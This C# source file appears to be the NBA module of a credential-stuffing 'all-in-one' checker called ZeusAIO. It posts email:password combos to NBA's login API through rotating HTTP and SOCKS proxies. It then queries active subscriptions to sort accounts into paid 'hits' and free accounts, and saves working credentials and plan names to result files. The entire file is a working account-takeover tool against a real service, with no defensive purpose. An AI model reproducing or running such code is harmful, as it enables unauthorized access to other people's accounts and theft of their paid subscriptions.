using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Leaf.xNet;
using System.Text.RegularExpressions;
using Console = Colorful.Console;
using System.Drawing;
using Valorant;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using ZeusAIO;
using TunnelBear;

namespace Nba
{
    class Check
    {
        public static bool CheckAccount(string[] s, string proxy)
        {
            for (int i = 0; i < Config.config.Retries + 1; i++)
                while (true)
                    try
                    {
                    Retry:
                        using (HttpRequest httpRequest = new HttpRequest())
                        {
                            proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount));
                            if (ZeusAIO.mainmenu.proxyProtocol == "HTTP")
                            {
                                httpRequest.Proxy = HttpProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS4")
                            {
                                httpRequest.Proxy = Socks4ProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS5")
                            {
                                httpRequest.Proxy = Socks5ProxyClient.Parse(proxy);
                            }
                            httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
                            httpRequest.IgnoreProtocolErrors = true;
                            httpRequest.AllowAutoRedirect = true;
                            string str = "{\"principal\":\"" + s[0] + "\",\"credential\":\"" + s[1] + "\",\"identityType\":\"EMAIL\",\"apps\":[\"responsys\",\"billing\",\"preferences\"]}";
                            httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback,
                             new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
                            string strResponse = httpRequest.Post("https://audience.nba.com/core/api/1/user/login", str, "application/json").ToString();
                            {
                                if (strResponse.Contains("User credentials are invalid"))
                                {
                                    //bads
                                    break;
                                }
                                else if (strResponse.Contains("responsys.manage")) //hit
                                {
                                    string b = strResponse;
                                    httpRequest.AddHeader("Authorization", b);
                                    string cap = httpRequest.Get("https://audience.nba.com/regwall/api/1/subscriptions/active", null).ToString();
                                    if (cap.Contains("{\"subscriptions\":[]}"))
                                    {
                                        ZeusAIO.mainmenu.frees++;
                                        if (Config.config.LogorCui == "2")
                                        {
                                            Console.WriteLine("[FREE - NBA] " + s[0] + ":" + s[1], Color.OrangeRed);
                                        }
                                        Export.AsResult("/Nba_frees", s[0] + ":" + s[1]);
                                        return false;
                                    }
                                    else
                                    {
                                        try
                                        {
                                            string Plan = Check.Parse(cap, "description\":", ",\"");
                                            ZeusAIO.mainmenu.hits++;
                                            if (Config.config.LogorCui == "2")
                                            {
                                                Console.WriteLine("[HIT - NBA] " + s[0] + ":" + s[1] + " | Plan: " + Plan, Color.Green);
                                            }
                                            Export.AsResult("/Nba_hits", s[0] + ":" + s[1] + " | Plan: " + Plan);
                                            return false;
                                        }
                                        catch
                                        {
                                            ZeusAIO.mainmenu.hits++;
                                            if (Config.config.LogorCui == "2")
                                            {
                                                Console.WriteLine("[HIT - NBA] " + s[0] + ":" + s[1] + " | Plan: " + "Cap Error", Color.Yellow);
                                            }
                                            Export.AsResult("/Nba_hits_cap_err", s[0] + ":" + s[1] + " | Plan: " + "Cap Error");
                                            return false;
                                        }
                                       
                                    }

                                }
                                else
                                {
                                    ZeusAIO.mainmenu.errors++;
                                    goto Retry;
                                }
                            }
                            //break;
                        }
                    }
                    catch (Exception ex)
                    {
                        ZeusAIO.mainmenu.errors++;
                    }
            return false;
        }

        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] { left }, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }
    }
}

